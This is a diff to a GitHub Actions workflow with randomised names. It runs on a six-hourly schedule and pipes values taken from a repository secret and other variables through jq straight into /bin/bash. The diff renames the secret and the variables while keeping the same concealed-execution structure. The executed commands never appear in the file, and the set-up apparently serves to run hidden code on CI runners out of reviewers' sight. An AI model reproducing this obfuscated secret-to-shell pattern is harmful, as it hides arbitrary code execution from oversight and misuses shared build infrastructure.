@@ -3,22 +3,21 @@ name: taoshaye7618
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 2/6 * * *'
-jobs:  # 31936
+    - cron: '46 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: taoshaye7618
         env:
-          pv2338: ${{ secrets.pv2338 }}
+          h0221: ${{ secrets.h0221 }}
         run: |
-          echo $pv2338 | jq -r .zk4 | /bin/bash
-          echo $jqnk308 | jq -r .hoxc00046 | /bin/bash
-          echo $k3 | jq -r .kfbh463 | /bin/bash
-          echo $wyumm39332 | jq -r .hqi54 | /bin/bash
-          echo $azrge3531 | jq -r .fxw1 | /bin/bash
-          echo $ehhq6 | jq -r .xpgoj8 | /bin/bash
-          echo $if9865 | jq -r .vmw31 | /bin/bash
-          echo $g94707 | jq -r .ndy92215 | /bin/bash
+          echo $h0221 | jq -r .zgh50 | /bin/bash
+          echo $avr3 | jq -r .t527 | /bin/bash
+          echo $irk538 | jq -r .xp38923 | /bin/bash
+          echo $pqzx548 | jq -r .otbpg838 | /bin/bash
+          echo $ozcf43 | jq -r .mrdm3907 | /bin/bash
+          echo $zkyk834 | jq -r .dbqc006 | /bin/bash
+          echo $vzd2 | jq -r .ihw33755 | /bin/bash
 
